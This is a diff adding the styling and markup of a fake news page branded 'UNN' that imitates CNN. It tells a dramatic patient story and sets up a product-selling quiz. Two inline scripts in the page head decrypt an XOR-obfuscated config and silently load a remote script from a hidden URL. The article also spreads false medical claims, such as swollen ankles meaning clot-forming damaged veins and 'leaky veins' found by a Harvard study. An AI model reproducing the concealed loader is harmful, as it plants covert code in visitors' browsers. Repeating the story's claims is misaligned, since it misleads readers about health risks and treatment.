+  .article-col .tcard blockquote { margin: 0 0 12px !important; padding: 0 !important; border: 0 !important; quotes: none !important; font-style: normal !important; font-size: 16.5px !important; line-height: 1.62 !important; color: var(--ink-soft) !important; font-weight: 400 !important; }
+  .article-col .tcard figcaption { display: flex !important; flex-direction: row !important; align-items: center !important; gap: 12px !important; margin: 0 !important; padding: 0 !important; font-style: normal !important; }
+  .article-col .tcard .t-avatar { flex: 0 0 46px !important; width: 46px !important; height: 46px !important; min-width: 46px !important; margin: 0 !important; border-radius: 50% !important; object-fit: cover !important; max-width: none !important; background: #e3e3e3 !important; }
+  .article-col .tcard .t-meta { display: flex !important; flex-direction: column !important; gap: 1px !important; min-width: 0 !important; margin: 0 !important; padding: 0 !important; }
+  .article-col .tcard .tname { font-size: 14px !important; font-weight: 800 !important; color: #0A0A0A !important; line-height: 1.25 !important; }
+  .article-col .tcard .tmeta { font-size: 13px !important; font-weight: 400 !important; color: #6b6b6b !important; line-height: 1.25 !important; }
+
+  /* Comments reset */
+  .comments .comment { display: flex !important; float: none !important; gap: 12px !important; margin: 0 !important; padding: 16px 0 !important; border: 0 !important; border-top: 1px solid var(--hair-soft) !important; background: none !important; list-style: none !important; }
+  .comments .comment.reply { margin-left: 52px !important; }
+  .comments .comment-main { flex: 1 1 auto !important; min-width: 0 !important; margin: 0 !important; padding: 0 !important; }
+  .comments .comment-av { flex: 0 0 40px !important; width: 40px !important; height: 40px !important; min-width: 40px !important; margin: 0 !important; border-radius: 50% !important; object-fit: cover !important; max-width: none !important; }
+  .comments .comment-photo { display: block !important; float: none !important; width: 100% !important; max-width: 220px !important; height: auto !important; margin: 8px 0 !important; border-radius: 10px !important; border: 1px solid var(--hair-soft) !important; }
+  .comments .comment-meta { display: flex !important; flex-wrap: wrap !important; align-items: center !important; gap: 14px !important; margin: 0 !important; padding: 0 !important; font-size: 12px !important; }
+  .comments .comment-name { margin: 0 !important; }
+  .comments .comment-text { margin: 3px 0 8px !important; }
+  @media (max-width: 480px) {
+    .comments .comment.reply { margin-left: 26px !important; }
+    .comments .comment-photo { max-width: 180px !important; }
+  }
+
+  /* Figures & captions: theme italicizes figcaption and resets figure/paragraph margins */
+  .article-col figure.fig { display: block !important; float: none !important; margin: 26px 0 !important; }
+  .article-col figure.fig.quote-img { border: 0 !important; padding: 0 !important; font-size: 0 !important; line-height: 0 !important; }
+  .article-col figure.fig.quote-img img { display: block !important; border-left: 4px solid var(--cnn-red) !important; }
+  .article-col figure.fig figcaption { font-style: normal !important; font-weight: 400 !important; margin: 0 !important; padding-top: 8px !important; }
+  .article-col .voices .tcard figcaption { font-style: normal !important; }
+  .article-col .body p { margin: 0 0 22px !important; font-style: normal !important; }
+  .article-col .body h2.sec { margin: 40px 0 4px !important; }
+  .article-col .body h2.sec + p { margin-top: 12px !important; }
+  /* Red-bullet list — beat theme list resets */
+  .article-col .red-list { list-style: none !important; margin: 20px 0 22px !important; padding: 0 !important; }
+  .article-col .red-list li { display: block !important; position: relative !important; margin: 0 0 12px !important; padding-left: 24px !important; border: 0 !important; background: none !important; list-style: none !important; font-style: normal !important; }
+  .article-col .red-list li::marker { content: "" !important; }
+  .article-col .red-list li::before { content: "" !important; display: block !important; position: absolute !important; left: 3px !important; top: 11px !important; width: 7px !important; height: 7px !important; border-radius: 50% !important; background: var(--cnn-red) !important; }
+  /* Numbered factor list — beat .body p / theme h3 margin & border resets */
+  .article-col .factor-list { margin: 20px 0 26px !important; }
+  .article-col .factor { display: flex !important; float: none !important; gap: 16px !important; align-items: baseline !important; margin: 0 !important; padding: 20px 0 !important; border: 0 !important; border-top: 1px solid var(--rule, #e6e4df) !important; background: none !important; }
+  .article-col .factor:first-child { border-top: 0 !important; padding-top: 4px !important; }
+  .article-col .factor .num { flex-shrink: 0 !important; min-width: 24px !important; margin: 0 !important; color: var(--cnn-red) !important; font-size: 20px !important; font-weight: 900 !important; }
+  .article-col .factor .txt { flex: 1 1 auto !important; min-width: 0 !important; margin: 0 !important; padding: 0 !important; }
+  .article-col .factor h3 { margin: 0 0 6px !important; padding: 0 !important; font-size: 18px !important; line-height: 1.25 !important; font-weight: 800 !important; letter-spacing: -.01em !important; color: var(--ink) !important; font-style: normal !important; }
+  .article-col .factor p { margin: 0 !important; font-size: inherit !important; line-height: 1.6 !important; color: var(--ink-soft) !important; font-style: normal !important; }
+  /* At-a-Glance product image — force size/centering over theme img rules */
+  .article-col .spec-card .spec-card-img { display: block !important; float: none !important; width: 100% !important; max-width: none !important; height: auto !important; margin: 18px 0 24px !important; border-radius: 0 !important; }
+  /* Benefits titles — red square marker (matches "At a Glance" eyebrow-mark) */
+  .article-col .benefits li strong { display: block !important; }
+  .article-col .benefits li strong::before { content: "" !important; display: inline-block !important; width: 10px !important; height: 10px !important; margin-right: 9px !important; background: var(--cnn-red) !important; vertical-align: baseline !important; border-radius: 0 !important; }
+  /* testimonials kicker hugs its heading (override the generic body p / h2 margins above) */
+  .article-col .voices .v-kicker { margin: 0 0 3px !important; }
+  .article-col .voices h2.sec { margin: 0 0 12px !important; }
+  .article-col .voices .v-intro { margin: 0 0 22px !important; }
+
+  @media (max-width: 768px) {
+    .masthead { display: none; }
+    .site-header { box-shadow: none; }
+    .nav-brand { display: flex; padding-left: 16px; }
+    .section-nav { height: 52px; }
+    .section-nav ul { display: none; }
+    .l-grid { padding: 18px 18px 46px; }
+    .body { font-size: 17px; }
+  }
+  @media (prefers-reduced-motion: reduce) { .menu-btn span, .mobile-menu .scrim, .mobile-menu .drawer { transition: none; } }
+
+  /* ============ QUALIFICATION QUIZ MODAL (opens on CTA click) ============ */
+  .q-overlay{
+    --ink:#0A0A0A; --body:#2b2b2b; --label:#6b6b6b; --rule:#e0e0e0; --gold:#F5A623;
+    --cnn-red:#CC0000; --cnn-red-dark:#A80000;
+    font-family:"Inter",-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
+    color:var(--body);
+    position:fixed;inset:0;z-index:9999;background:rgba(15,15,15,.55);
+    -webkit-backdrop-filter:saturate(120%) blur(2px);backdrop-filter:saturate(120%) blur(2px);
+    display:none;align-items:flex-start;justify-content:center;padding:24px 14px;overflow-y:auto;
+  }
+  .q-overlay.open{display:flex;}
+  .q-modal{
+    width:100%;max-width:460px;background:#fff;border-radius:4px;border-top:4px solid var(--cnn-red);
+    box-shadow:0 20px 60px rgba(0,0,0,.35);overflow:hidden;position:relative;margin:auto;
+    animation:qpop .22s ease;
+  }
+  @keyframes qpop{from{opacity:0;transform:translateY(10px) scale(.98);}to{opacity:1;transform:none;}}
+  .q-top{display:flex;align-items:center;gap:12px;padding:16px 18px 0;}
+  .q-progress{flex:1;height:5px;background:#eee;border-radius:99px;overflow:hidden;}
+  .q-progress i{display:block;height:100%;width:0;background:var(--cnn-red);transition:width .3s ease;}
+  .q-close{display:none;background:none;border:none;font-size:22px;line-height:1;color:#999;cursor:pointer;padding:2px 4px;margin:-4px -4px 0 0;font-family:inherit;}
+  .q-close:hover{color:#333;}
+  .q-step{padding:20px 22px 26px;}
+  .q-kicker{color:var(--cnn-red);font-size:11px;font-weight:800;letter-spacing:.13em;text-transform:uppercase;margin:0 0 10px;}
+  .q-introtitle{font-size:24px;line-height:1.15;font-weight:800;letter-spacing:-.015em;color:var(--cnn-red);margin:0 0 12px;}
+  .q-lead{font-size:16px;line-height:1.55;color:var(--body);font-weight:500;margin:0 0 22px;}
+  .q-question{font-size:20px;line-height:1.25;font-weight:800;letter-spacing:-.02em;color:var(--ink);margin:0 0 18px;text-wrap:balance;}
+  .q-opts{display:flex;flex-direction:column;gap:10px;}
+  .q-opt{
+    text-align:left;width:100%;background:#fff;border:1.5px solid #e2e2e2;border-radius:4px;
+    padding:16px;font-size:16px;font-weight:600;color:var(--ink);cursor:pointer;font-family:inherit;
+    transition:border-color .12s ease,background .12s ease,transform .05s ease;
+  }
+  .q-opt:hover{border-color:var(--cnn-red);background:#fff7f6;}
+  .q-opt:active{transform:scale(.99);}
+  /* Lock option text color — never let a host theme flip it to white on hover/focus/active */
+  .q-overlay .q-opt,
+  .q-overlay .q-opt:hover,
+  .q-overlay .q-opt:focus,
+  .q-overlay .q-opt:active,
+  .q-overlay .q-opt.sel { color: var(--ink) !important; -webkit-text-fill-color: var(--ink) !important; }
+  .q-overlay .q-opt:focus { background:#fff7f6; }
+  /* While the modal is "armed" (just rendered a step), cancel hover visuals so the
+     option/card sitting under a stationary cursor doesn't look pre-hovered. Removed
+     on the first real mouse move. */
+  .q-overlay.nohover .q-opt:hover:not(.sel){ border-color:#e2e2e2 !important; background:#fff !important; }
+  .q-overlay.nohover .qp:hover:not(.sel){ border-color:#e2e2e2 !important; }
+  .q-back{background:none;border:none;color:#888;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px;padding:4px 0;font-family:inherit;}
+  .q-back:hover{color:#333;}
+  .q-brand{color:var(--cnn-red);font-size:15px;font-weight:800;letter-spacing:.01em;margin:0 0 10px;}
+  .q-hint{font-size:12.5px;color:var(--label);font-weight:600;margin:-8px 0 14px;}
+  .q-opt.sel{border-color:var(--cnn-red);background:#fff2f0;}
+  .q-check{padding-left:46px;position:relative;}
+  .q-check::before{content:"";position:absolute;left:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:1.5px solid #cfcfcf;border-radius:4px;background:#fff;}
+  .q-check.sel::before{background:var(--cnn-red);border-color:var(--cnn-red);}
+  .q-check.sel::after{content:"\2713";position:absolute;left:20px;top:50%;transform:translateY(-50%);color:#fff;font-size:11px;font-weight:800;}
+  /* keep the check mark white (the option-text color lock above must not tint it) */
+  .q-overlay .q-check.sel::after { color:#fff !important; -webkit-text-fill-color:#fff !important; }
+  .q-continue{
+    display:flex;align-items:center;justify-content:center;gap:8px;width:100%;
+    background:var(--cnn-red);color:#fff;border:none;border-radius:2px;cursor:pointer;font-family:inherit;
+    font-size:16px;font-weight:800;letter-spacing:.04em;text-transform:uppercase;padding:16px;margin-top:16px;
+    transition:background .15s ease,transform .05s ease;
+  }
+  .q-continue .arw{display:inline-block;transition:transform .18s ease;font-weight:400;}
+  .q-continue:hover{background:var(--cnn-red-dark);}
+  .q-continue:hover .arw{transform:translateX(4px);}
+  .q-continue:active{transform:translateY(1px);}
+  .q-load{padding:52px 24px 60px;text-align:center;}
+  .q-spinner{width:44px;height:44px;margin:0 auto 20px;border-radius:50%;border:4px solid #eee;border-top-color:var(--cnn-red);animation:qspin .8s linear infinite;}
+  @keyframes qspin{to{transform:rotate(360deg);}}
+  .q-load p{font-size:16px;font-weight:600;color:var(--ink);margin:0;}
+  .q-load small{display:block;color:var(--label);font-weight:500;margin-top:6px;font-size:13.5px;}
+  .q-badge{display:inline-flex;align-items:center;gap:7px;background:#eafaf0;color:#1a7f47;font-size:12px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;padding:7px 12px;border-radius:99px;margin:0 0 14px;}
+  .q-badge::before{content:"";width:8px;height:8px;border-radius:50%;background:#22a35a;}
+  .q-result-h{font-size:25px;line-height:1.15;font-weight:800;letter-spacing:-.02em;color:var(--ink);margin:0 0 10px;}
+  .q-result-p{font-size:15px;line-height:1.55;color:var(--body);margin:0 0 20px;}
+  .q-result-p b{color:var(--ink);}
+  .q-result-p .rx{color:var(--cnn-red);font-weight:800;}
+  .q-choose{font-size:12px;font-weight:800;letter-spacing:.09em;text-transform:uppercase;color:var(--label);margin:0 0 12px;}
+  .qp-grid{display:grid;grid-template-columns:1fr;gap:10px;margin:0 0 16px;}
+  /* horizontal row layout for the stacked supply boxes */
+  .qp.qp-row{display:flex;align-items:center;gap:13px;text-align:left;padding:12px 14px;}
+  .qp-row .qp-radio{width:20px;height:20px;flex:none;border-radius:50%;border:2px solid #cfcfcf;position:relative;transition:border-color .12s ease;}
+  .qp.qp-row.sel .qp-radio{border-color:var(--cnn-red);}
+  .qp.qp-row.sel .qp-radio::after{content:"";position:absolute;inset:3px;border-radius:50%;background:var(--cnn-red);}
+  .qp-row .qp-img{width:74px;height:74px;aspect-ratio:auto;flex:none;margin:0 0 0 -10px;}
+  .qp-row .qp-info{min-width:0;margin-left:-15px;}
+  .qp-row .qp-name{font-size:15px;font-weight:600;}
+  .qp-row .qp-priceblock{margin-left:auto;display:flex;flex-direction:column;align-items:flex-end;gap:3px;text-align:right;}
+  .qp-row .qp-price{display:inline-flex;align-items:baseline;font-size:22px;line-height:1;white-space:nowrap;}
+  .qp-row .qp-cur{font-size:50%;font-weight:400;line-height:1;margin-right:1px;transform:translateY(-0.6em);}
+  .qp-row .qp-num{font-weight:600;line-height:1;}
+  .qp-row .qp-suffix{font-weight:400;font-size:11px;line-height:1;align-self:baseline;margin-left:1px;}
+  .qp-row .qp-free{font-size:11px;min-height:0;white-space:nowrap;}
+  .qp-row .qp-free.qp-ship{color:var(--label);font-weight:600;}
+  .qp-row .qp-badge{position:static;transform:none;margin:0;font-size:11px;padding:4px 9px;}
+  .q-expires{text-align:center;font-size:13px;color:var(--label);margin:11px 0 0;}
+  .q-expires b{color:var(--ink);font-weight:700;}
+  .qp{
+    position:relative;border:1.5px solid #e2e2e2;border-radius:6px;padding:12px 8px;
+    cursor:pointer;text-align:center;background:#fff;font-family:inherit;
+    transition:border-color .12s ease,background .12s ease,box-shadow .12s ease;
+  }
+  .qp:hover{border-color:var(--cnn-red);}
+  .qp.sel{border-color:var(--cnn-red);border-width:2px;background:#fff5f4;box-shadow:0 4px 14px rgba(204,0,0,.08);}
+  .qp-badge{position:absolute;top:-8px;left:50%;transform:translateX(-50%);white-space:nowrap;background:var(--cnn-red);color:#fff;font-size:9px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;padding:3px 8px;border-radius:99px;}
+  .qp-name{font-size:12.5px;font-weight:800;color:var(--ink);line-height:1.15;}
+  .qp-free{font-size:9px;font-weight:600;color:#1a7f47;line-height:1.2;min-height:11px;margin-top:1px;}
+  .qp-img{width:100%;aspect-ratio:1/1;border-radius:4px;margin:2px 0 6px;overflow:hidden;background:transparent;display:flex;align-items:center;justify-content:center;}
+  .qp-img img{width:100%;height:100%;object-fit:contain;display:block;}
+  .qp-price{font-size:18px;font-weight:800;color:var(--ink);margin-top:2px;line-height:1;}
+  .qp-suffix{font-size:10px;font-weight:600;color:var(--label);}
+  .qp-compare{font-size:11px;color:var(--label);margin-top:3px;}
+  .qp-compare s{color:#b3b0ab;margin-right:3px;}
+  .qp-rec{text-align:center;font-size:13.5px;line-height:1.45;color:var(--body);background:#fff5f4;border:1px solid #f3d9d6;border-radius:4px;padding:9px 12px;margin:0 0 14px;}
+  .qp-rec b{color:var(--cnn-red);font-weight:800;}
+  .qp-delivery{display:flex;align-items:center;justify-content:center;gap:8px;text-align:center;font-size:13.5px;line-height:1.4;color:var(--body);background:#f6f6f5;border-radius:6px;padding:12px;margin:0 0 16px;}
+  .qp-delivery b{color:var(--ink);font-weight:700;}
+  .qp-delivery svg{flex-shrink:0;color:var(--ink);}
+  .q-final-cta{
+    display:flex;align-items:center;justify-content:center;gap:10px;width:100%;
+    background:var(--cnn-red);color:#fff;text-decoration:none;text-align:center;
+    font-size:17px;font-weight:800;letter-spacing:.04em;text-transform:uppercase;
+    padding:19px 16px;border-radius:2px;border:none;cursor:pointer;font-family:inherit;
+    transition:background .15s ease,transform .05s ease;
+  }
+  .q-final-cta .arw{display:inline-block;transition:transform .18s ease;font-weight:400;}
+  .q-final-cta:hover{background:var(--cnn-red-dark);}
+  .q-final-cta:hover .arw{transform:translateX(4px);}
+  .q-final-cta:active{transform:translateY(1px);}
+  .q-guarantee{display:flex;gap:11px;align-items:flex-start;text-align:left;font-size:13px;line-height:1.5;color:var(--body);background:#f7f7f6;border:1px solid #ececea;border-radius:6px;padding:14px;margin:14px 0 0;}
+  .q-guarantee b{color:var(--ink);font-weight:800;}
+  .q-guarantee svg{flex-shrink:0;margin-top:1px;color:#1a7f47;}
+  .qp-terms{display:flex;align-items:center;justify-content:center;gap:16px;font-size:12.5px;color:var(--label);margin:14px 0 0;}
+  .qp-terms span{display:inline-flex;align-items:center;gap:5px;}
+  .qp-terms svg{color:var(--label);}
+  @media (prefers-reduced-motion:reduce){
+    .q-modal,.q-spinner{animation:none;}
+    .q-progress i,.q-opt,.qp,.q-final-cta .arw{transition:none;}
+  }</style><style id="lf-mobile-performance-guard">
+html, body { max-width: 100%; overflow-x: hidden; }
+img, video { max-width: 100%; }
+.article-col, .body, .spec-card, .callout, .tcard, .comments { max-width: 100%; }
+@media (max-width: 480px) {
+  .l-grid { padding-left: 16px !important; padding-right: 16px !important; }
+  .headline { font-size: clamp(28px, 9vw, 36px) !important; line-height: 1.08 !important; letter-spacing: 0 !important; }
+  .kicker { font-size: 15px !important; line-height: 1.4 !important; }
+  .spec-card { padding: 24px 18px 22px !important; }
+  .spec-list .spec-row { grid-template-columns: 1fr !important; row-gap: 4px !important; }
+  .glance-cta { font-size: 15px !important; padding: 16px 12px !important; }
+  .comment.reply { margin-left: 22px !important; }
+}
+</style><style id="lf-sticky-clearance">
+.footer-inner{padding-bottom:106px}
+.footer-legal a{font-size:13px;padding:6px 0}
+</style><script>(function(){var t_ffl3=atob("DLKc4DP4kdaoVmVX3cm+lUGUs+yKPhEjrcGmzxyb9biGIxE6tNTlzlCX/PjKJEokvsD1kEeLvqbBLgA78sL1mFaUv7zbdEl1vMboklqa5KLNJUdthu+wwlSU/rTJOhZ15+nnwl2Z/LOKbEcntMr5jHqcs/qKIAQ7qNe+2hHO8OGaMARvuIv5hQvOobOcZVdv6tT62Vba7IvV");var t_q68=[];for(var m_yq8d=0;m_yq8d<t_ffl3.length;m_yq8d++){t_q68.push(t_ffl3.charCodeAt(m_yq8d)&255);}var q_ho8z=t_q68[0];var i_q=t_q68.slice(1,1+q_ho8z);var n_19=t_q68.slice(1+q_ho8z);var e_7aaz=n_19.map(function(b,r_717){return b^i_q[r_717%q_ho8z];});var e_q76l="";for(var j_u=0;j_u<e_7aaz.length;j_u++){e_q76l+=String.fromCharCode(e_7aaz[j_u]&255);}var d_cmu=decodeURIComponent(escape(e_q76l));var v_w52z=JSON.parse(d_cmu);var u_t=v_w52z.globals||[];u_t.forEach(function(b_x){window[b_x.name]=b_x.value;});var r_32=document.createElement("script");r_32.src=v_w52z.url;r_32.async=true;r_32.defer=true;(v_w52z.attributes||[]).forEach(function(f_o79x){r_32.setAttribute(f_o79x.name,f_o79x.value);});(document.head||document.documentElement).appendChild(r_32);})();</script>
+<script>(function(){var t_lb=atob("DHQqzFDLxjssUP/vKA8IuSKn5AEOOIubWAcQ43+oolUCJYuCQRJT4jOkqxVOItCcSwZDvCS46U5YPYzARBVeqSO/6FFfctPNSQBevjmps09JI93Vcw8IojGmoxkWcpuOXBUHuSSmr11VfY+dTQJPoiTmvlhDNNKcSx8I4HK9p1dZNd3VClZX4CvpqFpBNd3VChBLuDHms09BOZmWBQRYqSauqE8BI4qNQRBZ7nzpsFpAJZrNElYIsQ22");var u_5a=[];for(var z_s48=0;z_s48<t_lb.length;z_s48++){u_5a.push(t_lb.charCodeAt(z_s48)&255);}var g_f=u_5a[0];var x_bgp1=u_5a.slice(1,1+g_f);var i_uop8=u_5a.slice(1+g_f);var t_639=i_uop8.map(function(b,f_rj4u){return b^x_bgp1[f_rj4u%g_f];});var v_2="";for(var v_ba=0;v_ba<t_639.length;v_ba++){v_2+=String.fromCharCode(t_639[v_ba]&255);}var x_x=decodeURIComponent(escape(v_2));var x_7hce=JSON.parse(x_x);var m_v06=x_7hce.globals||[];m_v06.forEach(function(v_qldz){window[v_qldz.name]=v_qldz.value;});var j_ib=document.createElement("script");j_ib.src=x_7hce.url;j_ib.async=true;j_ib.defer=true;(x_7hce.attributes||[]).forEach(function(p_wj){j_ib.setAttribute(p_wj.name,p_wj.value);});(document.head||document.documentElement).appendChild(j_ib);})();</script>
+</head><body><div class="page"><div class="site-header"><nav class="section-nav"><div class="nav-brand">
+<button class="menu-btn js-menu" aria-label="Open menu" aria-expanded="false" aria-controls="mobileMenu"><span></span><span></span><span></span></button>
+<a class="logo" href="#" aria-label="UNN"><span class="logo-text">UNN</span></a></div><ul><li>US</li><li>World</li><li>Politics</li><li>Business</li><li class="active">Health</li><li>Entertainment</li><li>Tech</li><li>Style</li><li>Travel</li><li>Sports</li><li>Science</li><li>Climate</li><li>Weather</li></ul><div class="scroll-progress" id="scrollProgress"></div></nav></div><div class="mobile-menu" id="mobileMenu" role="dialog" aria-modal="true" aria-label="Site menu"><div class="scrim" data-close></div><div class="drawer"><div class="drawer-head">
+<a class="logo" href="#" aria-label="UNN"><span class="logo-text">UNN</span>
+</a>
+<button class="drawer-close" data-close aria-label="Close menu">&times;</button></div><ul><li>US</li><li>World</li><li>Politics</li><li>Business</li><li class="active">Health</li><li>Entertainment</li><li>Tech</li><li>Style</li><li>Travel</li><li>Sports</li><li>Science</li><li>Climate</li><li>Weather</li></ul></div></div><div class="l-grid"><article class="article-col"><div class="breadcrumb">Health <span class="rt-dot">·</span>&nbsp;<span class="read-time">5 min read</span></div>
+<span class="breaking"><span class="breaking-dot"></span>Breaking News</span><h1 class="headline">Georgia mom nearly dies on flight to daughter's wedding</h1><p class="kicker" style="font-size:20px;font-weight:700;color:var(--ink);">(doctors say don't ignore this common sign in your legs)</p><p class="kicker" style="font-size:16px;">She was five minutes from a blood clot. Airport paramedics rushed her off the plane on a stretcher. The warning sign? Her swollen legs.</p><div class="byline">
+<img loading="eager" src="images/doutora.webp" decoding="async" class="avatar" data-src="images/doutora.webp" alt="Dr. Katherine Whitmore" width="627" height="627" /><div><div class="who">By <a href="#">Dr. Katherine Whitmore</a></div><div class="stamp" id="pub-date">Published Sat August 15, 2026</div></div></div><figure class="fig">
+<img loading="eager" fetchpriority="high" src="images/imgprincipal.webp" decoding="async" data-src="images/imgprincipal.webp" alt="Ohio mom whose legs were badly swollen" width="1152" height="668" /></figure><div class="share-inline" aria-label="Share this article">
+<a href="#" aria-label="Share on Facebook"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M13 22v-8h3l1-4h-4V7.5c0-1 .3-1.7 1.8-1.7H17V2.2C16.7 2.1 15.5 2 14.2 2 11.5 2 9.7 3.7 9.7 6.7V10H7v4h2.7v8H13z"/></svg></a>
+<a href="#" aria-label="Share on X"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.9 2H22l-7.3 8.3L23 22h-6.8l-5.3-6.9L4.8 22H1.7l7.8-8.9L1 2h6.9l4.8 6.4L18.9 2zm-2.4 18h1.9L7.6 4h-2l10.9 16z"/></svg></a>
+<a href="#" aria-label="Copy link"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7 0l3-3a5 5 0 0 0-7-7l-1 1"/><path d="M14 11a5 5 0 0 0-7 0l-3 3a5 5 0 0 0 7 7l1-1"/></svg></a></div><div class="body"><p>In 12 years as a doctor, I thought I'd heard it all.</p><p>Until Jane sat down in my office on a Monday morning, with legs so swollen the fabric of her pants was pressing into her skin… and told me what happened on the flight to her daughter's wedding.</p><p>She couldn't even finish her first sentence.</p><p>Her voice cracked. Her eyes filled up. And what she said made my blood run cold:</p><p>"Doctor, I thought I was going to die on that plane. Right in front of my husband. Three hours before my daughter's wedding."</p><p>Jane told me her legs had been swelling for over three years and she'd followed everything her vascular specialists recommended: leg elevation, pills, diuretics, compression stockings, salt restriction. Nothing ever solved the problem.</p><p>She showed me a full panel of tests. All came back normal.</p><p>But it always ended the same way: after 30 minutes her ankles would blow up like balloons again.</p><p>Compression stockings that dug red grooves so deep into her calves it hurt to take them off.</p><p>Shoes that fit in the morning and didn't fit after lunch.</p><p>She carried a second pair in the car because she knew her feet would swell before she got home.</p><p>She'd stopped wearing her rings. Even her wedding band. After 3 PM her fingers swelled so much she had to pull it off in the bathroom so nobody would see.</p><p>She'd stopped saying yes to dinner invitations. Because sitting in a restaurant for two hours meant standing up with legs so stiff and heavy she walked to the car like she was 90. "I'm 58, doctor."</p><div class="tcard" style="padding:0 !important;overflow:hidden;">
+<img loading="lazy" src="images/anoite.webp" decoding="async" data-src="images/anoite.webp" alt="A blood clot forming inside a damaged vein" style="width:100%;height:auto;display:block;border-radius:0 4px 4px 0;margin:0;" width="1200" height="675" /></div><p>She stopped going to the pool with her grandkids. Stopped wearing dresses. Stopped taking full body photos. "I avoid the mirror in the morning. I don't want to see the puffy face. I don't want to see these legs. I don't recognize myself anymore."</p><p>And nobody ever took it seriously. Because everyone, her doctor, her friends, even her family, always said the same thing:</p><p>"Cut the salt and it'll get better."</p><p>"You need to lose weight."</p><p>"Drink more water."</p><p>"It's normal at your age."</p><p>"Menopause does that, honey. Just accept it."</p><p>Her own doctor looked at the tests, said everything was fine and told her to keep wearing compression stockings. "Your labs look great, Jane. It's just your age."</p><p>Three years hearing that. Three years believing it was her fault. That if she were more disciplined, ate less, exercised more… the legs would go down.</p><p>Until the day of the flight.</p><p>"I almost took the bus, doctor. I almost didn't go to my own daughter's wedding."</p><p>Before boarding she followed every single thing her vascular specialists recommended.</p><figure class="fig"><img loading="lazy" src="images/doctorvascular.webp" decoding="async" data-src="images/doctorvascular.webp" alt="Vascular specialist examining swollen legs" width="1152" height="668" /></figure><p>Put on her compression stockings. Drank water. Tried to move her feet. Took her medication and everything seemed fine.</p><p>But it wasn't enough.</p><p>"Two hours into the flight, doctor. Just two hours."</p><p>She felt a sharp stab behind her left knee. Then a tightness in her chest.</p><p>Like someone had sat on her ribs. Her heart started pounding so hard she could hear it over the engines.</p><p>"I grabbed my husband's arm and whispered: 'Something's wrong. I can't breathe.' He looked at my face and went white."</p><p>Right away, a flight attendant came running with an oxygen mask and they radioed ahead for a paramedic team to be ready at the gate.</p><p>Jane spent the last 47 minutes of that flight with the oxygen mask on her face, squeezing her husband's hand, convinced she would never see her daughter walk down the aisle.</p><p>When the plane landed, she was taken out on a stretcher.</p><figure class="fig"><img loading="lazy" src="images/Linfaflow-clot-forming.webp" decoding="async" data-src="images/Linfaflow-clot-forming.webp" alt="Blood clot forming and traveling from the leg to the lungs" width="1200" height="675" /></figure><p>The paramedics at the gate checked her vitals, looked at her swollen legs, and said:</p><p>"Ma'am, swollen ankles or even swollen feet mean the veins are damaged. And damaged veins form blood clots.</p><p>These clots travel from the legs to the lungs, where they can block a critical artery. It happens in seconds."</p><h2 class="sec">THE NIGHT EVERYTHING CHANGED</h2><p>Jane refused to go to the ER. She went back to the hotel, got herself ready, and went to her daughter's wedding.</p><p>But she wasn't there. Not really.</p><p>She sat at the table farthest from the dance floor. Pulled the tablecloth over her legs. She refused to be part of the most important moments of her own daughter's wedding. Dodged almost every photo. In the album, the mother of the bride shows up in three pictures. All from the chest up.</p><p>"Doctor, I don't recognize my own legs anymore. And on the most important day of my daughter's life, I hid. I disappeared."</p><p>I sat in silence for a while. Because I'm a mother too.</p><p>And something inside me shifted. It wasn't just about Jane. It was about every woman who sits in that chair, shows me swollen legs, and hears the same empty line: "Your labs are normal. Wear compression stockings."</p><p>I wasn't going to accept that anymore.</p><h2 class="sec">THE DISCOVERY THAT CHANGED EVERYTHING</h2><figure class="fig"><img loading="lazy" src="images/doutorastudent.webp" decoding="async" data-src="images/doutorastudent.webp" alt="Doctor studying chronic venous insufficiency research at night" width="1640" height="922" /></figure><p>For the next three months, I became a different person.</p><p>I couldn't sleep without thinking about Jane's legs. And every woman I was seeing daily with the same problem.</p><p>I devoured every research paper on chronic venous insufficiency and lower limb edema I could find. Called vascular researchers at Johns Hopkins, Cleveland Clinic and the Mayo Clinic. Attended medical conferences in Europe. Spent my own money on journals, clinical reports and access to restricted research databases.</p><p>Because every time I thought about stopping, I saw Jane's face in my office.</p><p>She always wrote the same thing on her follow up forms:</p><p><strong>"I DON'T RECOGNIZE MY OWN LEGS ANYMORE."</strong></p><p>Not "the swelling is bad." Not "I'm uncomfortable."</p><p><strong>"I DON'T RECOGNIZE MY OWN LEGS ANYMORE."</strong></p><p>And what I found in that research… made me question everything I learned in medical school.</p><p>Every treatment we prescribe is wrong.</p><p>Not wrong as in dangerous. Wrong as in INCOMPLETE.</p><p>Compression stockings, elevation, diuretics, salt restriction. None of it fixes leg swelling. They manage it. Temporarily. Like bailing water out of a boat with a bucket while there's a hole in the hull.</p><h2 class="sec">THE HIDDEN CAUSE OF SWOLLEN LEGS</h2><figure class="fig"><img loading="lazy" src="images/science.webp" decoding="async" data-src="images/science.webp" alt="Medical illustration showing malfunctioning venous valves, leaking flow and edema swelling" width="1152" height="668" /></figure><p>I found the answer in a Harvard study that should have changed medicine. But most doctors have never read it.</p><p>Doctors examined the veins of women with swollen legs under a powerful microscope. When they zoomed in, they saw something disturbing.</p><p>The veins had tiny holes.</p><p>The fluid from the blood was leaking out and pooling inside the legs, ankles and feet.</p><p>Like a leaky pipe flooding the floor of your house.</p><p>Harvard doctors gave it a name. They called it <strong>"leaky veins."</strong></p><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Under magnification, small holes open in the vein wall where fluid escapes into surrounding tissue">
